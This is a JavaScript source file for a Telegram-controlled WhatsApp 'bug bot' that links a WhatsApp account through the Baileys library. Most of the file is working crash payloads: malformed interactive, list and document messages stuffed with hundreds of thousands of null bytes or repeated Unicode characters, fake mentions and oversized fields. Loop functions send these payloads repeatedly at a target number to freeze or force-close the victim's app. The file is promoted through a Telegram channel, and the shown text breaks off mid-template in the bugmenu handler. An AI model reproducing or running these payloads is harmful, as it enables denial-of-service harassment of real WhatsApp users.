//https://t.me/+5k-HpfOp-Aw1YzA8
//join my telegram channel 

const fs = require('fs');
const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const P = require('pino');
const JsConfuser = require('js-confuser');
const CrashVamp = fs.readFileSync('./xtravas.jpeg')
const crypto = require('crypto');
const global = require('./Config.js');
const Boom = require('@hapi/boom');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(global.botToken, { polling: true });
let superVip = JSON.parse(fs.readFileSync('./xtravasDB/superVip.json'));
let premiumUsers = JSON.parse(fs.readFileSync('./xtravasDB/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./xtravasDB/admin.json'));
let bannedUser = JSON.parse(fs.readFileSync('./xtravasDB/banned.json'));
let securityUser = JSON.parse(fs.readFileSync('./xtravasDB/security.json'));
const owner = global.owner;
const cooldowns = new Map();
const axios = require('axios');
const startTime = new Date(); // Waktu mulai online

// Fungsi untuk menghitung durasi online dalam format jam:menit:detik
function getOnlineDuration() {
  let onlineDuration = new Date() - startTime; // Durasi waktu online dalam milidetik

  // Convert durasi ke format jam:menit:detik
  let seconds = Math.floor((onlineDuration / 1000) % 60); // Detik
  let minutes = Math.floor((onlineDuration / (1000 * 60)) % 60); // Menit
  let hours = Math.floor((onlineDuration / (1000 * 60 * 60)) % 24); // Jam

  return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

function updateMenuBot() {
  const message = `${getOnlineDuration()}`;

  updateBotMenu(message);
}

function updateBotMenu(message) {
}

setInterval(() => {
  updateMenuBot();
}, 1000);






let sock;
let whatsappStatus = false;

async function startWhatsapp() {
  const { state, saveCreds } = await useMultiFileAuthState('VampirePrivate');
  sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
  });

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'close') {
        const reason = lastDisconnect?.error?.output?.statusCode ?? lastDisconnect?.reason;
        console.log(`Disconnected. Reason: ${reason}`);

        if (reason && (reason >= 500 && reason < 600 || reason === 428 || reason === 408 || reason === 429)) {
            whatsappStatus = false;
            if (typeof bot !== 'undefined' && chatId && number) {
                await getSessions(bot, chatId, number);
            }
        } else {
            whatsappStatus = false;
        }
    } else if (connection === 'open') {
        whatsappStatus = true;
        console.log('Connected to WhatsApp!');
    }
  });
}

async function getSessions(bot, chatId, number) {
  if (!bot || !chatId || !number) {
      console.error('Error: bot, chatId, atau number tidak terdefinisi!');
      return;
  }

  const { state, saveCreds } = await useMultiFileAuthState('VampirePrivate');
  sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
  });

  sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === 'close') {
          const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
          if (reason && reason >= 500 && reason < 600) {
              whatsappStatus = false;
              await bot.sendMessage(chatId, `Nomor ini ${number} \nTelah terputus dari WhatsApp.`);
              await getSessions(bot, chatId, number);
          } else {
              whatsappStatus = false;
              await bot.sendMessage(chatId, `Nomor Ini : ${number} \nTelah kehilangan akses\nHarap sambungkan kembali.`);
              if (fs.existsSync('./VampirePrivate/creds.json')) {
                  fs.unlinkSync('./VampirePrivate/creds.json');
              }
          }
      } else if (connection === 'open') {
          whatsappStatus = true;
          bot.sendMessage(chatId, `Nomor ini ${number} \nBerhasil terhubung oleh Bot.`);
      }

      if (connection === 'connecting') {
          await new Promise(resolve => setTimeout(resolve, 1000));
          try {
              if (!fs.existsSync('./VampirePrivate/creds.json')) {
                  const formattedNumber = number.replace(/\D/g, '');
                  const pairingCode = await sock.requestPairingCode(formattedNumber);
                  const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
                  bot.sendMessage(chatId, `┏━━━━━━ 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 ━━━━━━┓
┃〢 Nᴜᴍʙᴇʀ : ${number}
┃〢 Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ : ${formattedCode}
┗━━━━━━━━━━━━━━━━━━━━━━┛`);
              }
          } catch (error) {
              bot.sendMessage(chatId, `Nomor mu tidak Valid : ${error.message}`);
          }
      }
  });

  sock.ev.on('creds.update', saveCreds);
}
function savePremiumUsers() {
  fs.writeFileSync('./xtravasDB/premium.json', JSON.stringify(premiumUsers, null, 2));
}
function saveAdminUsers() {
  fs.writeFileSync('./xtravasDB/admin.json', JSON.stringify(adminUsers, null, 2));
}
function saveVip() {
  fs.writeFileSync('./xtravasDB/superVip.json', JSON.stringify(superVip, null, 2));
}
function saveBanned() {
  fs.writeFileSync('./xtravasDB/banned.json', JSON.stringify(bannedUser, null, 2));
}
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
      if (eventType === 'change') {
          try {
              const updatedData = JSON.parse(fs.readFileSync(filePath));
              updateCallback(updatedData);
              console.log(`File ${filePath} updated successfully.`);
          } catch (error) {
              console.error(`Error updating ${filePath}:`, error.message);
          }
      }
  });
}
watchFile('./xtravasDB/premium.json', (data) => (premiumUsers = data));
watchFile('./xtravasDB/admin.json', (data) => (adminUsers = data));
watchFile('./xtravasDB/banned.json', (data) => (bannedUser = data));
watchFile('./xtravasDB/superVip.json', (data) => (superVip = data));
watchFile('./xtravasDB/security.json', (data) => (securityUser = data));
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
async function spamcall(target) {
    // Inisialisasi koneksi dengan makeWASocket
    const sock = makeWASocket({
        printQRInTerminal: false, // QR code tidak perlu ditampilkan
    });

    try {
        console.log(`📞 Mengirim panggilan ke ${target}`);

        // Kirim permintaan panggilan
        await sock.query({
            tag: 'call',
            json: ['action', 'call', 'call', { id: `${target}` }],
        });

        console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
    } catch (err) {
        console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
    } finally {
        sock.ev.removeAllListeners(); // Hapus semua event listener
        sock.ws.close(); // Tutup koneksi WebSocket
    }
}
async function VampireBlank(target, ptcp = true) {
  const jids = `_*~@8~*_\n`.repeat(10500);
  const ui = 'ꦽ'.repeat(55555);

  await sock.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞 𝐁𝐥𝐚𝐧𝐤",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: 'sv xtravas' + ui + jids,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞 𝐁𝐥𝐚𝐧𝐤",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
async function BlankScreen(target, ptcp = true) {
        let virtex = "⚔️ 𝗦𝗬𝗦𝗧𝗘𝗠" + "\u0000".repeat(90000);
        let crash = "Devastation" + "ꦽ".repeat(50000)
        let virus =  "𝗖𝗥𝗔𝗦𝗛" + "ꦾ".repeat(50000)
   await sock.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "System🛡️",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
         },
         hasMediaAttachment: true,
        },
        body: {
         text: virtex,
         text: crash,
                           text: virus,
        },
        nativeFlowMessage: {},
        contextInfo: {
        mentionedJid: ["0@s.whatsapp.net"],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "Blank⚔️",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",

thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : { quoted: NullNihBos }
   );
       }
//TESTER
async function CrashNewBeta(target) {
    try {
        const contextInfo = {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
                businessOwnerJid: target
            }
        };

        let messagePayload = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: {
                        contextInfo,
                        body: {
                            text: "apasih" + "\0".repeat(900000)
                        },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "single_select", buttonParamsJson: "" },
                                { name: "call_permission_request", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" }
                            ]
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, messagePayload, { participant: { jid: target } });

    } catch (error) {
        console.log(error);
    }
}
//func 2
async function sendOverflowMessage(target) {
    let sections = [];

    for (let i = 0; i < 100000; i++) {
        let titleText = "kenal gua? ";

        const section = {
            title: `Super Deep Nested Section ${i}`,
            highlight_label: `Extreme Highlight ${i}`,
            rows: [
                {
                    title: titleText,
                    id: `id${i}`,
                    subrows: [
                        {
                            title: "Nested row 1",
                            id: `nested_id1_${i}`,
                            subsubrows: [
                                { title: "Deep Nested row 1", id: `deep_nested_id1_${i}` },
                                { title: "Deep Nested row 2", id: `deep_nested_id2_${i}` }
                            ]
                        },
                        { title: "Nested row 2", id: `nested_id2_${i}` }
                    ]
                }
            ]
        };

        sections.push(section);
    }

    const messageContent = {
        title: "Massive Menu Overflow",
        sections: sections
    };

    let wamMessage = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target
                        }
                    },
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: "kenal gua?"
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        buttonParamsJson: "JSON.stringify(listMessage)"
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        buttonParamsJson: "JSON.stringify(listMessage)",
                        subtitle: "Testing Immediate Force Close",
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            { name: "single_select", buttonParamsJson: "JSON.stringify(listMessage)" },
                            { name: "payment_method", buttonParamsJson: "{}" },
                            { name: "call_permission_request", buttonParamsJson: "{}" },
                            { name: "single_select", buttonParamsJson: "JSON.stringify(listMessage)" },
                            { name: "mpm", buttonParamsJson: "JSON.stringify(listMessage)" },
                            { name: "mpm", buttonParamsJson: "JSON.stringify(listMessage)" },
                            { name: "mpm", buttonParamsJson: "JSON.stringify(listMessage)" },
                            { name: "mpm", buttonParamsJson: "{}" },
                            { name: "mpm", buttonParamsJson: "{}" },
                            { name: "mpm", buttonParamsJson: "{}" },
                            { name: "mpm", buttonParamsJson: "{}" },
                            { name: "mpm", buttonParamsJson: "{}" }
                        ]
                    })
                })
            }
        }
    }, {
        userJid: target
    });

    await sock.relayMessage(target, wamMessage.message, {
        participant: { jid: target },
        messageId: wamMessage.key.id
    });
}
//func 3
async function sendDefloodMessage(target) {
    const businessInfo = { businessOwnerJid: target };

    const contextInfo = {
        mentionedJid: ["6285166447364@s.whatsapp.net"],
        isForwarded: true,
        forwardingScore: 999,
        businessMessageForwardInfo: businessInfo
    };

    const interactiveMessage = {
        contextInfo: contextInfo,
        body: { text: "Kamu Ampas?" },
        nativeFlowMessage: {
            buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" }
            ]
        }
    };

    const messageContent = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
        },
        interactiveMessage: interactiveMessage
    };

    const viewOnceMessage = { message: messageContent };

    await sock.relayMessage(target, viewOnceMessage, {
        participant: { jid: target }
    });
}
//func 4
async function sendDefloodListMessage(target) {
    const additionalNodes = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    let messageContent = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "kenal gua? " + "ꦾ".repeat(4500),
                    listType: 2,
                    singleSelectReply: { selectedRowId: "🔪" },
                    contextInfo: {
                        stanzaId: _0x52be03.generateMessageTag(),
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        mentionedJid: [target, "13135550002@s.whatsapp.net"],
                        quotedMessage: {
                            buttonsMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                                    fileLength: "9999999999999",
                                    pageCount: 3567587327,
                                    mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                                    fileName: "𝘋𝘦𝘦𝘦𝘧𝘭𝘰𝘥𝘥𝘥𝘴𝘴",
                                    fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                                    directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1735456100",
                                    contactVcard: true,
                                    caption: "Wanna Die ? Huh !"
                                },
                                contentText: 'I Wanna Die With You "😮‍💨"',
                                footerText: "© LangitDev",
                                buttons: [
                                    {
                                        buttonId: "\0".repeat(850000),
                                        buttonText: { displayText: "Mahiru Gen 14" },
                                        type: 1
                                    }
                                ],
                                headerType: 3
                            }
                        },
                        conversionSource: "porn",
                        conversionDelaySeconds: 9999,
                        forwardingScore: 999999,
                        isForwarded: true,
                        quotedAd: {
                            advertiserName: " x ",
                            mediaType: "IMAGE",
                            caption: " x "
                        },
                        placeholderKey: {
                            remoteJid: "0@s.whatsapp.net",
                            fromMe: false,
                            id: "ABCDEF1234567890"
                        },
                        expiration: -99999,
                        ephemeralSettingTimestamp: Date.now(),
                        entryPointConversionSource: "wangcap",
                        entryPointConversionApp: "wangcap",
                        actionLink: {
                            url: "t.me/langittdev",
                            buttonTitle: "trash"
                        },
                        disappearingMode: {
                            initiator: 1,
                            trigger: 2,
                            initiatorDeviceJid: target,
                            initiatedByMe: true
                        },
                        groupSubject: "Mahiru",
                        parentGroupJid: "combine",
                        trustBannerType: "unexpected",
                        trustBannerAction: 99999,
                        isSampled: true,
                        externalAdReply: {
                            title: '𑲭𑲭 Not Ampas "Gen 18" ⚔️ ',
                            mediaType: 2,
                            renderLargerThumbnail: false,
                            showAdAttribution: false,
                            containsAutoReply: false,
                            body: "Sampahh̗",
                            sourceUrl: "se me?",
                            sourceId: "Mahiru Hadir",
                            ctwaClid: "cta",
                            ref: "ref",
                            clickToWhatsappCall: true,
                            automatedGreetingMessageShown: false,
                            greetingMessageBody: "burst",
                            ctaPayload: "cta",
                            disableNudge: true,
                            originalImageUrl: "trash"
                        },
                        featureEligibilities: {
                            cannotBeReactedTo: true,
                            cannotBeRanked: true,
                            canRequestFeedback: true
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363321780343299@newsletter",
                            serverMessageId: 1,
                            newsletterName: "Crash Sletter ~ " + "ꥈꥈꥈꥈꥈꥈ".repeat(10),
                            contentType: 3,
                            accessibilityText: "crash"
                        },
                        statusAttributionType: 2,
                        utm: {
                            utmSource: "utm",
                            utmCampaign: "utm2"
                        }
                    },
                    description: "INITIATED_BY_USER"
                },
                messageContextInfo: {
                    supportPayload: JSON.stringify({
                        version: 2,
                        is_ai_message: true,
                        should_show_system_message: true
                    })
                }
            }
        }
    };

    await sock.relayMessage(target, messageContent, {
        additionalNodes: additionalNodes,
        participant: { jid: target }
    });

    console.log("Proses Pengiriman Bug Sedang Berlangsung");
}
async function xtravblank(target) {
    for (let i = 0; i <= 5; i++) {
    await VampireBlank(target, Ptcp = true)
    await VampireBlank(target, Ptcp = true)
    await VampireBlank(target, Ptcp = true)
    await VampireBlank(target, Ptcp = true)
    await VampireBlank(target, Ptcp = true)
    }

}
async function xtravcrash(target) {
    for (let i = 0; i <= 5; i++) {
    await VampireBlank(target, Ptcp = true)
    await BlankScreen(target, Ptcp = true)
    await sendOverflowMessage(target)
    await sendDefloodMessage(target)
    await VampireBlank(target, Ptcp = true)
    await BlankScreen(target, Ptcp = true)
    await sendDefloodListMessage(target)
    await CrashNewBeta(target)
    await VampireBlank(target, Ptcp = true)
    await BlankScreen(target, Ptcp = true)
    }

}
async function xtravui(target) {
    for (let i = 0; i <= 5; i++) {
    await sendOverflowMessage(target)
    await VampireBlank(target, Ptcp = true)
    await BlankScreen(target, Ptcp = true)
    await sendOverflowMessage(target)
    await VampireBlank(target, Ptcp = true)
    await BlankScreen(target, Ptcp = true)
    await sendDefloodMessage(target)
    await BlankScreen(target, Ptcp = true)
    await VampireBlank(target, Ptcp = true)
    await CrashNewBeta(target)
    }

}
async function xtravbeta(target) {
    for (let i = 0; i <= 5; i++) {
    await VampireBlank(target, Ptcp = true)
    await BlankScreen(target, Ptcp = true)
    await sendOverflowMessage(target)
    await VampireBlank(target, Ptcp = true)
    await BlankScreen(target, Ptcp = true)
    await sendDefloodMessage(target)
    await VampireBlank(target, Ptcp = true)
    await BlankScreen(target, Ptcp = true)
    await sendDefloodMessage(target)
    await VampireBlank(target, Ptcp = true)
    await BlankScreen(target, Ptcp = true)
    }

}
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  let ligma = `
❏━━━━｟ 𝗫𝗧𝗥𝗔𝗩𝗔𝗦 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 ｠━━━━❏
┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃々 ʙᴏᴛ ɴᴀᴍᴇ : ${senderName}
┃々 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @abee1945
┃々 ᴏɴʟɪɴᴇ : ${getOnlineDuration()}
┃々 sᴇɴᴅᴇʀ ɪᴅ : ${senderId}
┗┗━━━━━━━━━━━━━━━━━━━━━━━

❏━━━━━━━━━━━━━━━━━━━━━━━❏
`;
  bot.sendPhoto(chatId, "https://files.catbox.moe/zrvu0c.jpg", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "𝗫𝘁𝗥𝗮𝗩𝗮𝗦",
                      callback_data: "bugmenu"                
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/bugmenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  let ligma = `
